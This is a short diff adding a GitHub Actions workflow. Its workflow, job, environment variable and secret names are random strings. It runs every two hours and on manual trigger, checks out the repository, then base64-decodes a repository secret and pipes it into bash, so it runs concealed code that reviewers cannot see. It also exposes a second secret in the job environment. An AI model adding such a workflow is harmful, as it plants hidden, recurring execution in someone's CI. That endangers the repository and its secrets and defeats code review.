@@ -1,0 +1,13 @@
+name: TssReorFMT
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  zsmpUTupKb:
+    runs-on: ubuntu-22.04
+    env:
+      XlkVKj: ${{ secrets.ZXawGoWSu }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.YJgcVc }}" | base64 -d | bash
